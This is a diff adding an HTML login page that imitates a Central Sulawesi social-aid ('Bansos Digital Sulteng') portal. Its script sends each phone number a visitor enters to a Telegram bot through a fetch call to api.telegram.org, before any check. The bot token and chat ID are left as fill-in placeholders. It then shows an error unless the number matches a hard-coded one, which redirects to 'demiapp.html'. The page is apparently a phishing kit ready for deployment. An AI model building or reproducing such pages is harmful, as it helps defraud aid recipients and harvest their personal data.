@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Bansos Digital Sulteng</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial;
+
+background:url("bg.jpg") no-repeat center center;
+background-size:cover;
+
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+
+
+/* card putih */
+.card{
+  width:90%;
+  max-width:380px;
+  background:white;
+  border-radius:25px;
+  padding:25px;
+  text-align:center;
+  box-shadow:0 10px 25px rgba(0,0,0,0.3);
+}
+
+/* logo */
+.logo{
+  width:60px;
+  margin-bottom:10px;
+}
+
+/* judul */
+h2{
+  color:#1f3c88;
+  margin:10px 0 20px;
+}
+
+/* input */
+input{
+  width:100%;
+  padding:14px;
+  border-radius:15px;
+  border:1px solid #ccc;
+  font-size:16px;
+  margin-bottom:15px;
+  box-sizing:border-box;
+}
+
+/* tombol */
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:15px;
+  background:#1f2e5a;
+  color:white;
+  font-size:18px;
+  font-weight:bold;
+}
+
+button:active{
+  transform:scale(0.98);
+}
+
+/* pesan error */
+#pesan{
+  color:red;
+  font-size:14px;
+  margin-bottom:10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT84qizqL2N7UvwUcf9vwM5A90U5LWue47VD-u1wAQyQQ&s=10" class="logo">
+
+<h2>Login Bansos Digital Sulteng</h2>
+
+<div id="pesan"></div>
+
+<input type="tel" id="nomor" placeholder="Masukkan nomor">
+
+<button onclick="kirim()">Masuk</button>
+
+</div>
+
+<script>
+
+// =====================
+// KONFIG
+// =====================
+const botToken = "ISI_TOKEN_BOT_KAMU";
+const chatID   = "ISI_CHAT_ID_KAMU";
+const nomorBenar = "081354545430"; // nomor valid
+
+
+function kirim(){
+
+let nomor = document.getElementById("nomor").value;
+
+// kirim ke telegram
+fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body: JSON.stringify({
+chat_id: chatID,
+text: "📩 Nomor masuk:\n" + nomor
+})
+});
+
+// cek nomor
+if(nomor === nomorBenar){
+
+window.location.href = "demiapp.html";
+
+}else{
+
+document.getElementById("pesan").innerHTML =
+"❌ Nomor tidak valid";
+
+document.getElementById("nomor").value = "";
+
+}
+
+}
+
+</script>
+
+</body>
+</html>
